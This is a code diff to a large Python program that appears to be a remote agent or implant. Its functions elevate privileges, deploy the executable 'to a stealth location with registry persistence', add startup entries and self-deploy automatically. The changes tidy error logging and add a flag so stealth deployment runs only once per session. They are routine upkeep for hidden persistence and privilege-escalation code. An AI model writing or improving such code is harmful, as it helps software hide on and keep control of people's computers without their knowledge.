@@ -672,8 +672,8 @@ def elevate_privileges():
                 # Try to use sudo if available
                 subprocess.run(['sudo', '-n', 'true'], check=True, capture_output=True)
                 return True
-        except:
-            pass
+        except Exception as e:
+            log_message(f"Failed to check sudo availability: {e}", "warning")
         return False
     
     if is_admin():
@@ -2198,6 +2198,13 @@ def show_pyinstaller_instructions():
 
 def deploy_executable_with_persistence():
     """Deploy the executable to a stealth location with registry persistence."""
+    global DEPLOYMENT_COMPLETED
+    
+    # Check if deployment was already completed in this session
+    if DEPLOYMENT_COMPLETED:
+        log_message("Deployment already completed in this session, skipping")
+        return True
+        
     if not WINDOWS_AVAILABLE:
         return False
     
@@ -2247,6 +2254,7 @@ def deploy_executable_with_persistence():
         except Exception as e:
             log_message(f"[WARN] Registry persistence failed: {e}")
         
+        DEPLOYMENT_COMPLETED = True
         return True
         
     except Exception as e:
@@ -7594,7 +7602,7 @@ def add_registry_startup():
         log_message(f"[ERROR] Registry startup failed: {e}")
         # Print detailed error information
         import traceback
-        traceback.print_exc()
+        log_message(f"Exception details: {traceback.format_exc()}", "error")
 
 def add_startup_folder_entry():
     """Add to Windows startup folder."""
@@ -7720,6 +7728,7 @@ def agent_main():
             log_message(f"[WARN] Could not add to startup: {e}")
         
         # Auto self-deploy when running (only if not already deployed)
+        global DEPLOYMENT_COMPLETED
         if not DEPLOYMENT_COMPLETED:
             try:
                 log_message("Initiating automatic self-deployment...")
